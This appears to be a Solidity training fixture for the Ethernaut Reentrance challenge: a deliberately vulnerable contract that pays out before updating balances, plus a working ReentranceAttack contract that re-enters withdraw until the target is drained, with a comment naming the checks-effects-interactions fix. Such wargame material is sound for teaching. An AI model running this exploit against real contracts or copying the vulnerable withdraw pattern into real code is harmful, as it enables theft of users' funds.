// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautReentrance {
    mapping(address => uint256) public balances;

    constructor() payable {}

    function donate(address to) external payable {
        balances[to] += msg.value;
    }

    function balanceOf(address who) external view returns (uint256) {
        return balances[who];
    }

    function withdraw(uint256 amount) external {
        if (balances[msg.sender] >= amount) {
            (bool ok,) = msg.sender.call{value: amount}("");
            if (ok) {
                unchecked {
                    balances[msg.sender] -= amount;
                }
            }
        }
    }

    receive() external payable {}
}

contract ReentranceAttack {
    EthernautReentrance public target;
    uint256 public chunk;
    uint256 public drained;

    function attack(EthernautReentrance target_, uint256 amount) external payable {
        target = target_;
        chunk = amount;
        target_.donate{value: msg.value}(address(this));
        target_.withdraw(amount);
    }

    receive() external payable {
        drained += msg.value;
        uint256 remaining = address(target).balance;
        if (remaining > 0) {
            uint256 next = remaining < chunk ? remaining : chunk;
            target.withdraw(next);
        }
    }
}

// Local training fixture for the classic Ethernaut Reentrance challenge.
// The checks-effects-interactions fix is to decrement before the external call.

